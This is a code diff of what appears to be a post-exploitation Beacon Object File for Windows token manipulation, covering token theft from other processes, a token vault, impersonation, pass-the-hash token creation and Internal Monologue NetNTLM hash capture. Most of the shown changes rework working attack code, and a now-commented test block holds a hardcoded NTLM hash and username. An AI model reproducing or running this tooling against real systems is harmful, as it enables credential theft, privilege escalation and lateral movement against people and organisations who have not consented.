@@ -27,50 +27,6 @@
  * can not change the primary token on a running process using NtSetInformationProcess, do it a suspended process maybe??
  */
 
-VOID TokenLookupPrivilege(
-	IN PLUID  Luid,
-	OUT PCHAR PrivName
-) {
-	if ( Luid->HighPart == 0 && Luid->LowPart == 2 ) MSVCRT$strcpy( PrivName, "SeCreateTokenPrivilege\0" );
-	else if ( Luid->HighPart == 0 && Luid->LowPart == 3 ) MSVCRT$strcpy( PrivName, "SeAssignPrimaryToken\0" );
-	else if ( Luid->HighPart == 0 && Luid->LowPart == 4 ) MSVCRT$strcpy( PrivName, "SeLockMemoryPrivilege\0" );
-	else if ( Luid->HighPart == 0 && Luid->LowPart == 5 ) MSVCRT$strcpy( PrivName, "SeIncreaseQuotaPrivilege\0" );
-	else if ( Luid->HighPart == 0 && Luid->LowPart == 6 ) MSVCRT$strcpy( PrivName, "SeMachineAccountPrivilege\0" );
-	else if ( Luid->HighPart == 0 && Luid->LowPart == 7 ) MSVCRT$strcpy( PrivName, "SeTcbPrivilege\0" );
-	else if ( Luid->HighPart == 0 && Luid->LowPart == 8 ) MSVCRT$strcpy( PrivName, "SeSecurityPrivilege\0" );
-	else if ( Luid->HighPart == 0 && Luid->LowPart == 9 ) MSVCRT$strcpy( PrivName, "SeTakeOwnershipPrivilege\0" );
-	else if ( Luid->HighPart == 0 && Luid->LowPart == 10 ) MSVCRT$strcpy( PrivName, "SeLoadDriverPrivilege\0" );
-	else if ( Luid->HighPart == 0 && Luid->LowPart == 11 ) MSVCRT$strcpy( PrivName, "SeSystemProfilePrivilege\0" );
-	else if ( Luid->HighPart == 0 && Luid->LowPart == 12 ) MSVCRT$strcpy( PrivName, "SeSystemTimePrivilege\0" );
-	else if ( Luid->HighPart == 0 && Luid->LowPart == 13 ) MSVCRT$strcpy( PrivName, "SeProfSingleProcessPrivilege\0" );
-	else if ( Luid->HighPart == 0 && Luid->LowPart == 13 ) MSVCRT$strcpy( PrivName, "SeIncBasePriorityPrivilege\0" );
-	else if ( Luid->HighPart == 0 && Luid->LowPart == 14 ) MSVCRT$strcpy( PrivName, "SeIncBasePriorityPrivilege\0" );
-	else if ( Luid->HighPart == 0 && Luid->LowPart == 15 ) MSVCRT$strcpy( PrivName, "SeCreatePageFilePrivilege\0" );
-	else if ( Luid->HighPart == 0 && Luid->LowPart == 16 ) MSVCRT$strcpy( PrivName, "SeCreatePermanentPrivilege\0" );
-	else if ( Luid->HighPart == 0 && Luid->LowPart == 17 ) MSVCRT$strcpy( PrivName, "SeBackupPrivilege\0" );
-	else if ( Luid->HighPart == 0 && Luid->LowPart == 18 ) MSVCRT$strcpy( PrivName, "SeRestorePrivilege\0" );
-	else if ( Luid->HighPart == 0 && Luid->LowPart == 19 ) MSVCRT$strcpy( PrivName, "SeShutdownPrivilege\0" );
-	else if ( Luid->HighPart == 0 && Luid->LowPart == 20 ) MSVCRT$strcpy( PrivName, "SeDebugPrivilege\0" );
-	else if ( Luid->HighPart == 0 && Luid->LowPart == 21 ) MSVCRT$strcpy( PrivName, "SeAuditPrivilege\0" );
-	else if ( Luid->HighPart == 0 && Luid->LowPart == 22 ) MSVCRT$strcpy( PrivName, "SeSystemEnvironmentPrivilege\0" );
-	else if ( Luid->HighPart == 0 && Luid->LowPart == 23 ) MSVCRT$strcpy( PrivName, "SeChangeNotifyPrivilege\0" );
-	else if ( Luid->HighPart == 0 && Luid->LowPart == 24 ) MSVCRT$strcpy( PrivName, "SeRemoteShutdownPrivilege\0" );
-	else if ( Luid->HighPart == 0 && Luid->LowPart == 25 ) MSVCRT$strcpy( PrivName, "SeUndockPrivilege\0" );
-	else if ( Luid->HighPart == 0 && Luid->LowPart == 26 ) MSVCRT$strcpy( PrivName, "SeSyncAgentPrivilege\0" );
-	else if ( Luid->HighPart == 0 && Luid->LowPart == 27 ) MSVCRT$strcpy( PrivName, "SeEnableDelegationPrivilege\0" );
-	else if ( Luid->HighPart == 0 && Luid->LowPart == 28 ) MSVCRT$strcpy( PrivName, "SeManageVolumePrivilege\0" );
-	else if ( Luid->HighPart == 0 && Luid->LowPart == 29 ) MSVCRT$strcpy( PrivName, "SeImpersonatePrivilege\0" );
-	else if ( Luid->HighPart == 0 && Luid->LowPart == 30 ) MSVCRT$strcpy( PrivName, "SeCreateGlobalPrivilege\0" );
-	else if ( Luid->HighPart == 0 && Luid->LowPart == 31 )
-		MSVCRT$strcpy( PrivName, "SeTrustedCredmanAccessPrivilege\0" );
-	else if ( Luid->HighPart == 0 && Luid->LowPart == 32 ) MSVCRT$strcpy( PrivName, "SeRelabelPrivilege\0" );
-	else if ( Luid->HighPart == 0 && Luid->LowPart == 33L ) MSVCRT$strcpy( PrivName, "SeIncWorkingSetPrivilege\0" );
-	else if ( Luid->HighPart == 0 && Luid->LowPart == 34 ) MSVCRT$strcpy( PrivName, "SeTimeZonePrivilege\0" );
-	else if ( Luid->HighPart == 0 && Luid->LowPart == 35 ) MSVCRT$strcpy( PrivName, "SeCreateSymbolicLinkPrivilege\0" );
-	else if ( Luid->HighPart == 0 && Luid->LowPart == 36 )
-		MSVCRT$strcpy( PrivName, "SeDelegationSessionUserImpersonatePrivilege\0" );
-}
-
 NTSTATUS TokenAddVault(
 	IN HANDLE         token,
 	IN OPTIONAL ULONG pidStolen,
@@ -136,12 +92,12 @@ NTSTATUS TokenAddVault(
 		}
 	} else {
 		// set the domain
-		domainLen          = MSVCRT$wcslen( domain );
+		domainLen          = StringLenW( domain );
 		tokenEntry->Domain = NTDLL$RtlAllocateHeap( NtCurrentHeap(), HEAP_ZERO_MEMORY, domainLen * 2 );
 		MemCopy( tokenEntry->Domain, domain, domainLen * 2 );
 
 		// set the username
-		usernameLen          = MSVCRT$wcslen( username );
+		usernameLen          = StringLenW( username );
 		tokenEntry->Username = NTDLL$RtlAllocateHeap( NtCurrentHeap(), HEAP_ZERO_MEMORY, usernameLen * 2 );
 		MemCopy( tokenEntry->Username, username, usernameLen * 2 );
 	}
@@ -220,7 +176,7 @@ NTSTATUS TokenAddVault(
 	}
 
 	if ( tokenVault->NbEntry == 0 ) {
-		tokenEntry->Id = tokenVault->LastId = 1;
+		tokenEntry->Id    = tokenVault->LastId = 1;
 		tokenVault->First = tokenEntry;
 	} else {
 		tokenLoopEntry = tokenVault->First;
@@ -229,7 +185,7 @@ NTSTATUS TokenAddVault(
 			tokenLoopEntry = tokenLoopEntry->Next;
 		}
 
-		tokenEntry->Id = ++tokenVault->LastId;
+		tokenEntry->Id       = ++tokenVault->LastId;
 		tokenLoopEntry->Next = tokenEntry;
 	}
 
@@ -251,22 +207,21 @@ END:
  * @return
  * 	ntstatus
  */
+/* interesting information to query
+ * Username + SID
+ * Privileges (Enabled/Disabled)
+ * Groups (Enabled/Disabled) + SID
+ * Impersonation Level -> whether you can impersonate the token
+ * Integrity Level
+ * GrantAccess: AssignPrimary, Duplicate, Impersonate...
+ * Elevated (just means has one of the following privs and so high privs) if it matches a certain RID, considered Elevated too
+ * 	- SeCreateTokenPrivilege, SeTcpPrivilege, SeTakeOwnershipPrivilege, SeLoadDriverPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeDebugPrivilege, SeImpersonatePrivilege, SeDelegationSessionUserImpersonatePrivilege
+ * Some privileged like SeDebugPrivilege can not be enabled on non-high integrity level processes
+ * TODO: RELEASE THE MEMORY
+ */
 NTSTATUS TokenInfo(
 	IN HANDLE Token
 ) {
-	/* interesting information to query
-	 * Username + SID
-	 * Privileges (Enabled/Disabled)
-	 * Groups (Enabled/Disabled) + SID
-	 * Impersonation Level -> whether you can impersonate the token
-	 * Integrity Level
-	 * GrantAccess: AssignPrimary, Duplicate, Impersonate...
-	 * Elevated (just means has one of the following privs and so high privs) if it matches a certain RID, considered Elevated too
-	 * 	- SeCreateTokenPrivilege, SeTcpPrivilege, SeTakeOwnershipPrivilege, SeLoadDriverPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeDebugPrivilege, SeImpersonatePrivilege, SeDelegationSessionUserImpersonatePrivilege
-	 * Some privileged like SeDebugPrivilege can not be enabled on non-high integrity level processes
-	 * TODO: RELEASE THE MEMORY
-	 */
-
 	NTSTATUS                     status                  = { 0 };
 	PTOKEN_USER                  UserInfo                = { 0 };
 	ULONG                        size                    = { 0 };
@@ -355,15 +310,6 @@ NTSTATUS TokenInfo(
 		) ) ) {
 			PRINT_NT_ERROR( "NtQueryInformationToken", status );
 			return status;
-		}
-
-		// loop through privileges
-		for ( int PrivCnt = 0 ; PrivCnt < GroupsAndPrivilegesInfo->PrivilegeCount ; PrivCnt++ ) {
-			Priv = &GroupsAndPrivilegesInfo->Privileges[ PrivCnt ];
-
-			TokenLookupPrivilege( &Priv->Luid, PrivName );
-
-			PRINTF( "%s : %s\n", PrivName, (Priv->Attributes & SE_PRIVILEGE_ENABLED) ? "Enabled" : "Disabled" );
 		}
 
 		for ( int SidCnt = 0 ; SidCnt < GroupsAndPrivilegesInfo->SidCount ; SidCnt++ ) {
@@ -478,12 +424,10 @@ NTSTATUS TokenSteal(
 	}
 
 	// store the token
-	/*
 	if ( ! NT_SUCCESS( TokenAddVault( Token, Pid, NULL, NULL, NULL ) ) ) {
 		PRINTF( "[!] Failed to add the token to the vault\n" );
 		goto END;
 	}
-	*/
 
 	// print the token
 	PRINTF( "[+] Successfully stole token of process with id %ld: 0x%08X\n", Pid, Token )
@@ -502,7 +446,8 @@ NTSTATUS TokenImpersonate(
 	PTOKEN_VAULT TokenVault = { 0 };
 
 	// get the token vault
-	TokenVault = BeaconGetValue( TOKEN_VAULT_KEY );
+	//TokenVault = BeaconGetValue( TOKEN_VAULT_KEY );
+	TokenVault = NULL;
 
 	if ( TokenVault && TokenVault->NbEntry ) {
 		TokenEntry = TokenVault->First;
@@ -543,7 +488,8 @@ VOID TokenRev2Self() {
 	PTOKEN_VAULT TokenVault = { 0 };
 
 	// get the token vault
-	TokenVault = BeaconGetValue( TOKEN_VAULT_KEY );
+	//TokenVault = BeaconGetValue( TOKEN_VAULT_KEY );
+	TokenVault = NULL;
 
 	if ( TokenVault ) {
 		// clear the current token
@@ -673,6 +619,7 @@ VOID TokenCreate() {
  *
  * @return
  */
+
 NTSTATUS TokenInternalMonologue(
 	IN BOOL netNtlmv1
 ) {
@@ -686,6 +633,7 @@ NTSTATUS TokenInternalMonologue(
 	CtxtHandle     serverCreds       = { 0 };
 	UNICODE_STRING username          = INIT_UNICODE_STRING( L"hola" );
 	UNICODE_STRING domain            = INIT_UNICODE_STRING( L"WORKGROUP" );
+
 
 	/*
 	 * get a negotiate token
@@ -738,9 +686,9 @@ NTSTATUS TokenInternalMonologue(
 	// user::domain:serverchallenge:ntProofStr:ntlmv2ClientChallenge
 
 END:
-	if ( negotiateToken.pvBuffer ) SECUR32$FreeContextBuffer( negotiateToken.pvBuffer );
-	if ( challengeToken.pvBuffer ) SECUR32$FreeContextBuffer( challengeToken.pvBuffer );
-	if ( authenticateToken.pvBuffer ) SECUR32$FreeContextBuffer( authenticateToken.pvBuffer );
+	if ( negotiateToken.pvBuffer )SECUR32$FreeContextBuffer( negotiateToken.pvBuffer );
+	if ( challengeToken.pvBuffer )SECUR32$FreeContextBuffer( challengeToken.pvBuffer );
+	if ( authenticateToken.pvBuffer )SECUR32$FreeContextBuffer( authenticateToken.pvBuffer );
 	return status;
 }
 
@@ -809,7 +757,6 @@ NTSTATUS TokenMakePth(
 	}
 
 	// add to the vault
-	/*
 	if ( ! NT_SUCCESS( status = TokenAddVault(
 		accessToken,
 		0,
@@ -820,7 +767,6 @@ NTSTATUS TokenMakePth(
 		PRINTF( "[!] Failed to add the token to the vault\n" );
 		goto END;
 	}
-	*/
 
 END:
 	if ( negotiateToken.pvBuffer ) SECUR32$FreeContextBuffer( negotiateToken.pvBuffer );
@@ -831,9 +777,10 @@ END:
 }
 
 VOID go(
-	IN PCHAR Buffer,
-	IN ULONG Length
+	IN PCHAR args,
+	IN ULONG argc
 ) {
+	/*
 	UNICODE_STRING username      = INIT_UNICODE_STRING( L"noah" );
 	UNICODE_STRING domain        = INIT_UNICODE_STRING( L"WORKGROUP" );
 	CHAR           hashString[ ] = "b7b608b19ea2cd47963e58ec9d609a56";
@@ -845,4 +792,20 @@ VOID go(
 	//TokenInternalMonologue( FALSE );
 
 	//TokenGetuid( NtCurrentProcessToken() );
+	*/
+
+	/*
+	datap parser     = { 0 };
+	PSTR  command    = { 0 };
+	INT   commandLen = { 0 };
+
+	BeaconDataParse( &parser, args, argc );
+
+	command = BeaconDataExtract( &parser, &commandLen );
+
+	if ( StringCompareA( command, "list" ) ) {
+		// list the tokens present in the vault
+		PRINTF( "List command" );
+	}
+	*/
 };
